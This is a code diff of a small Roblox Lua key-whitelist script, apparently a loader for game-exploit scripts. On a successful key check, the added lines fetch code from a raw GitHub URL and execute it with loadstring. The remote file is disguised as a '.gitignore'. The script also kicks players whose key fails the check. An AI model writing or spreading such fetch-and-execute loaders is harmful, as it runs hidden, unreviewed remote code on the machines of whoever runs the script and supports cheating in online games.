@@ -1,3 +1,6 @@
+--Beemo's simple whitelist
+_G.Key = ""
+
 local keys = {
     "Key1",
     "Key2",
@@ -16,8 +19,8 @@ for i,v in pairs(keys) do
             --Whitelisted!
             print("Successfully whitelisted!")
             keyCheck = _G.Key
-            keys = "Key1","Key2","key3"
-            
+            keys = ""
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/ygzak/wltv1/main/.gitignore'))()
         else
             counter = counter +1
         end
@@ -30,4 +33,5 @@ while true do
     else
         game.Players.LocalPlayer:Kick("Do not try and spoof your key!")
     end
+    wait()
 end
